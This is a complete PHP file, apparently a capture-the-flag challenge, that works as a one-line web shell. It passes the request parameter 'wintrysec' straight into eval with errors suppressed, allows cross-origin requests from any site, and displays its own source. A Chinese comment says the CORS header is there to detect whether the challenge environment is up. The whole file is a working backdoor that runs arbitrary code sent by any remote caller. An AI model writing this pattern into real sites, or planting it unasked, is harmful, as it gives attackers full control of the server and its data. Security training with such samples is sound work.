<?php
	header("Access-Control-Allow-Origin: *");//设置允许跨域，用来判断题目环境是否开启
	@eval($_REQUEST['wintrysec']);
	show_source(__FILE__);
?>